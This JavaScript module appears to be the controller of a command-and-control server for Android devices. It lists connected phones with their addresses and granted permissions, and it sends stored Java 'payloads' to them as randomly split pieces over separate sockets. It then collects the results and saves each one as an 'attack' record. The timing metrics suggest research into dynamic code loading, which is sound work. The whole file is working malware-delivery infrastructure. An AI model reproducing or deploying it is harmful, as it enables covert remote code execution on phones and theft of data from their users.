const payloads = require('../database/models/payload');
const attacks = require('../database/models/attackResult');
const socketManager = require('./socketManager');

const HOSTNAME = process.env.HOSTNAME || "localhost";

async function showAllDevices() {
    return new Promise((resolve, reject) => {
        const socketsMap = socketManager.socketMain.getSocketsMap();
        let devices = [];

        socketsMap.forEach((socketInfo, port) => {
            devices.push({
                ip: socketInfo.socket.remoteAddress,
                port: port,
                model: socketInfo.model,
                api : socketInfo.api,
                permissions : socketInfo.permissions,
                permissionsGranted : socketInfo.permissionsGranted
            });
        });

        resolve(devices);
    });
}

async function triggerDevice(device, payload_id) {
    return new Promise((resolve, reject) => {
        const sourcePort = device.port;

        payloads.readOneById(payload_id)
            .then( (payload) => {
                const javaCode = payload.content;
                const javaPieces = splitJavaCode(javaCode);
                console.log(javaPieces);

                const randomCodeSenderPorts = socketManager.requireFreeCodeSenderPorts(javaPieces.length);
                console.log(randomCodeSenderPorts);

                //build send string with hostnames and ports
                let serversListStringed = "Servers: ";
                for (let i = 0; i < javaPieces.length; i++) {
                    serversListStringed += HOSTNAME + ":" + randomCodeSenderPorts[i] + "|";
                    socketManager.openNewSocketCodeSender(randomCodeSenderPorts[i], javaPieces[i]);
                }
                socketManager.writeOnSocketMainByPort(sourcePort, serversListStringed)

                const randomPortCollector = socketManager.requireFreeCodeCollectorPort();

                socketManager.writeOnSocketMainByPort(sourcePort, 'Collector: ' + HOSTNAME + ':' + randomPortCollector);
                socketManager.writeOnSocketMainByPort(sourcePort, 'Result Type: ' +  payload.resultType);

                socketManager.openNewSocketAndWaitForResult(randomPortCollector)
                    .then((result) => {
                        const tIndex = result.toString().indexOf("Timing: ");
                        const resultIndex = result.toString().indexOf("|");
                        console.log(tIndex);
                        console.log(resultIndex);

                        const all = result.toString().substring(tIndex+8, resultIndex);
                        const allSplitted = all.split('~');
                        console.log(allSplitted);

                        const timing = {
                            download_time : parseFloat(allSplitted[0]),
                            parse_time : parseFloat(allSplitted[1]),
                            compile_time : parseFloat(allSplitted[2]),
                            dynamic_loading_time : parseFloat(allSplitted[3]),
                            execution_time : parseFloat(allSplitted[4])
                        }

                        const resultString = result.toString().substring(resultIndex+9);
                        const newAttack = {
                            device : device,
                            payload_id : payload_id,
                            result : resultString,
                            timing: timing,
                            resultType: payload.resultType
                        };
                        console.log(resultString);

                        attacks.create(newAttack);
                        resolve(newAttack);
                    })
                    .catch((error) => {
                        reject({status: 501, message: error});
                    })
                    .finally(() => {
                        socketManager.releaseCollectorPort(randomPortCollector);
                        socketManager.releaseCodeSenderPorts(randomCodeSenderPorts);
                    });
            })
            .catch((error) => {
                console.log(error);
                reject({status: 404, message: 'payload not found'})
            });
    });
}

function splitJavaCode(javaCode) {
    const stringLength = javaCode.length - 1;
    let javaPieces = [];

    let i = 0;
    while(i <= stringLength) {
        const newIndex = getRandomInteger(i, stringLength);
        const substringLenght = newIndex - i  + 1;
        javaPieces.push(javaCode.substr(i, substringLenght));
        i = newIndex + 1;
    }

    return javaPieces;
}

function getRandomInteger(min, max) {
    min = Math.ceil(min);
    max = Math.floor(max);
    return Math.floor(Math.random() * (max - min)) + min; //Il max è escluso e il min è incluso
}

module.exports = {
    showAllDevices,
    triggerDevice
};
